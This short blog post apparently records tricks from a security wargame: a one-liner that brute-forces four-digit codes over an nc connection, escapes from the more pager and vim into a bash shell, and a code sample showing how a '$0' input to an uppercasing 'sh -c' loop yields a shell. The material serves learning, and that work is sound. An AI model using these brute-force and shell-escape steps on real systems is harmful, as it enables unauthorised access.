---
layout: post
title: "hack the planet"
---

## {{ page.title }}

###### {{ page.date | date_to_string }}

Try n credential attemps in single `nc` connections:

    for i in $(seq -s " " -f %04g 0 10000);do echo password attempt $i; done | nc localhost 30002

Escape `more` pager:

 * resize terminal window until `more` pauses due to non sufficient space to show text #tested in git4win/powershell
 * press 'v' to launch a vim readonly instance

Escape `vim`:

    :set shell=/bin/bash
    :shell

Abuse `sh|bash` extrapolations, C sample:

    while(true) {
      print(">> ");
      cmd = makeUppercase(readInput());
      print(execute("sh", "-c", cmd)); #security issue here
    } #execute launches 'sh -c cmd' which on this case init the variable $0 to the name of the program 'sh'

Therefore if we type `$0`, it would execute `sh -c sh`, giving away a shell!

    $0
    # bash #now we move to a more confortable shell

Happy hacking! &#128522;
